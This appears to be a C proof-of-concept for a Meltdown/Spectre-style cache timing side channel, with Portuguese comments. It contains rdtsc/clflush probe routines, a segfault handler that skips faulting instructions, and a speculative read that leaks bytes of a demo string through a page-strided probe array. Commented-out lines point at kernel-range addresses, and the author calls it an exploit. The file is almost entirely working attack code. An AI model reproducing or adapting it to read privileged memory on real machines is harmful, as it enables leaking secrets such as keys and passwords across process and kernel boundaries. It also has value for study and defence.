#define _GNU_SOURCE




#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>

#include <x86intrin.h>
#include <stdlib.h>

#define NUM_ITERACOES 100
#define CACHE_LINE_LEN	128
#define LEN_PAGE	4096
#define TRIAL_TIMES	 1000

#define KNRM  "\x1B[0m"
#define KRED  "\x1B[31m"
#define KGRN  "\x1B[32m"
#define KYEL  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMAG  "\x1B[35m"
#define KCYN  "\x1B[36m"
#define KWHT  "\x1B[37m"


static inline void Flush(void *);

int isSegfault=0;
static inline long Probe(void *addr) {
	/*ignora as otimizacoes*/
	volatile unsigned long tempo;
	/*exploit quase original*/
	asm __volatile__ (
				"  mfence             ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  lfence             ;"
				"  mov %%eax, %%esi  ;"	
				"  mov (%1), %%al   ;"
				"  lfence             ;"
				"  rdtsc              ;"
				"  sub %%esi, %%eax   ;"
				: "=a" (tempo)
				: "c" (addr)
   			);
  return tempo;
}

static inline void Flush(void *addr)
{
	asm __volatile__(
			"mfence		;"
			"clflush 0(%0)	;"
			"mfence		;"
			"lfence		;"
			: : "r" (addr)
			);
}


unsigned Treshold(void *baseSrc)
{

	void* base=baseSrc;
	unsigned i=0;
	unsigned j=0;
	unsigned probe;
	unsigned long long totalComFlush=0;
	unsigned long long totalSemFlush=0;
	//Flush(base);
	while (i<NUM_ITERACOES)
	{
		for (j=0;j<256;j++)
		{
		
		
			probe=Probe(base+j*LEN_PAGE);
			totalComFlush+=probe;
			printf("com flush %8X\n",probe);
		
			probe=Probe(base+j*LEN_PAGE);
			totalSemFlush+=probe;
			i++;
		
			printf("sem flush %8X\n",probe);
	
		}
	}
	totalComFlush=totalComFlush/(i);
	totalSemFlush=totalSemFlush/(i);
	printf("media com flush = %08X\n",(unsigned)totalComFlush);
	printf("media sem flush = %08X\n",(unsigned )totalSemFlush);
		

	return (totalComFlush*0.1+totalSemFlush*0.9);

}

static inline int FindSecret(void *baseSrc,unsigned treshold)
{
	void *base=baseSrc;
	unsigned tempo;
	unsigned menort=999999;
	int i=1;
	int isValid=0;
  	unsigned char alvo;	
	while (i<256){
		
		tempo=Probe(base+i*LEN_PAGE);
		//printf("i=%u,tempo=%8x\n",i,tempo);
		if (tempo<treshold)
		{
			if(tempo<menort)
			{
			  menort=tempo;
		  	  alvo=i;
			  //printf("%c",i);

			}
		  isValid=1;
		}	
		base++;
		i++;
	}
	//printf("%c",alvo);
	if (isSegfault)
	{
	
		printf("%s",KRED);	
		isSegfault=0;
	}
	else{
	
		printf("%s",KGRN);
	}

	if (isValid)
	{
	  
	  if (alvo > 'A' && alvo < '}'){
	      printf("%c",alvo);
	  }
	  else{	
	        printf(".");
	  }
	}
	else{
		printf(",");
	}
	printf("%s",KNRM);
	return isValid;


}


void handler(int nSignum, siginfo_t* si, void* vcontext) {
  
  //printf("inorando\n");
  isSegfault=1;
  ucontext_t* context = (ucontext_t*)vcontext;
  context->uc_mcontext.gregs[REG_EIP]++;
}


int installHandler() {


/*credits to https://gist.github.com/fairlight1337/55978671ace2c75020eddbfbdd670221 */	
  struct sigaction action;
  memset(&action, 0, sizeof(struct sigaction));
  action.sa_flags = SA_SIGINFO;
  action.sa_sigaction = handler;
  sigaction(SIGSEGV, &action, NULL);
  
  int* x = 0;
  int y = *x;
  
  printf("igonring\n");	
  
  return 0;
}
int lerBloco( char*segredo,unsigned threshold)
{
	int i,ret;
	int lista[256];
	void *ptrArray;
	int res;
	for (i=0;i<LEN_PAGE;i++ )
	{
	 
		ptrArray=malloc(LEN_PAGE*257)+LEN_PAGE;	
		ret=*((int *)(ptrArray+(unsigned)segredo[i]*LEN_PAGE));
		asm __volatile__(
				"mfence\n"
				"lfence\n"
				);
	
		FindSecret(ptrArray,threshold);
		free(ptrArray-LEN_PAGE);	

			
	}

	return 0;

}


static inline void spec(char *addr , char *base )
{
	char dummy= 0;
	char *buffer[210];
	int i;
	register char **target;
	//printf("sizeof char *= %i\n",sizeof(char *));
	//printf("&dummy = %p\n",&dummy);
	for (i=0; i <100; i++)
	{
		buffer[i] = &dummy;
	
	}
	for (i=100; i <200; i++)
	{
		buffer[i] = addr;
	
	}
	buffer[i] = addr+1;
	//printf("&buffer = %p\n",buffer);
	//printf("*buffer = %p\n",buffer[0]);
	//printf("addr = %p\n",addr);

	for(target=buffer;(*target)!=addr+1; target++)
	{
		//target=buffer[i];
		asm __volatile__(
				"mov %0 ,%%edx                   			 \n"
				"mov %1 , %%ebx                    			 \n" 
				//.rept 50000                   					 \n" 
			//	add $10 , %%eax                   					 \n" 
			//	.endr                   					 \n" 
				//nop                   					 \n" 
				"xor %%eax, %%eax                   					 \n" 
				"mov (%%edx), %%al                   		 \n;" 
				"shl $12, %%eax                    \n" 
				"mov (%%ebx,%%eax,1) , %%cl                    		\n" 
				::"m"(*target) , "m" (base):"edx", "eax", "ecx","ebx"   );
	
		//printf("buffer[%i]=%p\n",i,buffer[i]);
		//printf("*iter = %p",*iter);
		//printf("ptr: %p,  content=%c \n",*iter,*(*iter));
		//printf("target=%p\n",*target);
		//printf("target=%c\n",*(*target));
	}

}

static inline void ReadByte(int treshold ,int fd, char *addr , char *base )
{
 
	int i;
	int ret;
	char buf[200];
	void *ptrArray;
	for(i=0; i <1; i++)
	{
		ptrArray=malloc(LEN_PAGE*257)+LEN_PAGE;	
		ret = pread(fd, buf, sizeof(buf), 0);
		if (ret < 0) {
				perror("pread");
				break;
		}

		spec(addr, (char *)ptrArray);
		asm __volatile__(
				"mfence\n"
				"lfence\n"
				);

		FindSecret(ptrArray,treshold);
		free(ptrArray-LEN_PAGE);	
	
	}

}


int main(void)
{
	int fd;
	unsigned long i;
	unsigned treshold;
	void *ptrArray;
	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";
    printf("%sred\n", KRED);
    printf("%sgreen\n", KGRN);
    printf("%syellow\n", KYEL);
    printf("%sblue\n", KBLU);
    printf("%smagenta\n", KMAG);
    printf("%scyan\n", KCYN);
    printf("%swhite\n", KWHT);
    printf("%snormal\n", KNRM);

	installHandler();


	treshold=Treshold(malloc(LEN_PAGE*257)+LEN_PAGE);
	printf("treshold: %08X\n",treshold);

	//segredo=0xb75b2000;
	//segredo=0xb7551000;
	printf("segredo= %p\n",segredo);	
	//i=0;
	//while (segredo+i < 0xFFFFF000)
	//{
	  //printf("\nlendo, %p\n",segredo+i);
  	  //lerBloco(segredo+i,treshold);
	  //i+=LEN_PAGE*128;
	
	

	//}
	//segredo=(char  *)0xd983b060;


	fd = open("/proc/version", O_RDONLY);
	if (fd < 0) {
		perror("open");
		return -1;
	}

	for(i=0;i<10 ; i++)
	{
 
		ReadByte(treshold,fd , segredo+i, (char *)ptrArray);
	}
}
















